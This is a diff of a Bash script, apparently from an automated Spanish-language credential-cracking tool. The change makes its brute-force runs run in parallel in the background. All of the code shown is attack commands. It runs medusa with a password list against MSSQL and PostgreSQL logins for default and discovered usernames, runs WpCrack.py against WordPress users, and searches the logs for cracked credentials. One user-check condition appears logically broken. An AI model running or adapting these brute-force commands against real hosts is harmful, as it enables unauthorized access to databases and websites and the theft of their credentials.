@@ -164,7 +164,7 @@ then
 
 			if [[ -z "$ENTIDAD" && "$ENTIDAD" != NULL ]];then
 				echo -e "\n medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 "  >>  logs/cracking/"$ip"_mongo_passwordBD.txt
-				medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_mongo_passwordBD.txt
+				medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M mssql -f -t 1 >>  logs/cracking/"$ip"_mongo_passwordBD.txt &
 			fi
 			
 		fi		
@@ -184,14 +184,14 @@ then
 		
 		echo -e "[+] Probando $ip"
 		echo "medusa -e n -u postgres -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		medusa -e n -u postgres -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
+		medusa -e n -u postgres -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null &
 		
 		echo -e "\n medusa -e n -u pgsql -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		medusa -e n -u pgsql -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
+		medusa -e n -u pgsql -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null &
 		
 		if [ -z "$ENTIDAD" ]; then
 			echo -e "\nmedusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres -f -t 1 "  >>  logs/cracking/"$ip"_5432_passwordBD.txt
-			medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt
+			medusa -e n -u $ENTIDAD -P passwords.txt -h $ip -M postgres -f -t 1 >>  logs/cracking/"$ip"_5432_passwordBD.txt &
 		fi		
 		
 	 done	
@@ -348,7 +348,7 @@ then
 					for user in $(cat .vulnerabilidades2/"$host"_"$port"_wpUsers.txt |sort| awk '{print $2}'); do
 						echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
 						echo "WpCrack.py -t $ip_port_path -u $user --p passwords.txt" >> logs/cracking/"$host"_"$user"-"$port"_passwordCMS.txt
-						WpCrack.py -t $ip_port_path -u $user --p passwords.txt >> logs/cracking/"$host"_"$user"-"$port"_passwordCMS.txt 2>> logs/cracking/"$host"_"$user"-"$port"_passwordCMS.txt 
+						WpCrack.py -t $ip_port_path -u $user --p passwords.txt >> logs/cracking/"$host"_"$user"-"$port"_passwordCMS.txt 2>> logs/cracking/"$host"_"$user"-"$port"_passwordCMS.txt
 						egrep -iaq "Credenciales" logs/cracking/"$host"_*_passwordCMS.txt 2>/dev/null
 						greprc=$?
 						if [[ $greprc -eq 0 ]] ; then	
